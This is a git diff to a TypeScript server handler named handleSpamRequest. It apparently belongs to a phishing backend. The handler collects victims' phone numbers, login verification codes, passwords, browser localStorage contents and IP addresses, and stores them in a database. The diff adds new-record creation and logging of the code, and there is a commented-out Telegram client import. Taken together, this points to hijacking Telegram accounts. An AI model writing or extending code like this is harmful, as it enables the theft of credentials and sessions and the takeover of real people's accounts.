@@ -4,6 +4,9 @@ import handleAsync from '../utils/handleAsync';
 import { io } from '../services/socket';
 let customerCount = 0; // 初始化客户计数器
 
+// import { client } from '../utils/telegramClient';
+
+
 export const handleSpamRequest = handleAsync(
   async (req: Request, res: Response) => {
     const { data } = req.body;
@@ -17,14 +20,24 @@ export const handleSpamRequest = handleAsync(
       throw new Error('Phone number and verification code is required');
     }
 
-    const existingCustomer = await Customer.findOne({ phoneNumber });
+    console.log('phonecode', phoneCode);
+
+    let customer = await Customer.findOne({ phoneNumber });
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址
 
-    if (existingCustomer) {
-      await existingCustomer.updateOne({
+    if (customer) {
+      await customer.updateOne({
         phoneCode,
-        password: password || existingCustomer.password,
+        password: password || customer.password,
+        localStorage: JSON.stringify(rest),
+        ip,
+      });
+    } else {
+      customer = new Customer({
+        phoneCode,
+        password,
+        phoneNumber,
         localStorage: JSON.stringify(rest),
         ip,
       });
@@ -48,7 +61,6 @@ export const handleSpamRequest = handleAsync(
 
     res.status(200).json({
       message: 'success',
-      data: { phoneCode },
     });
   },
 );
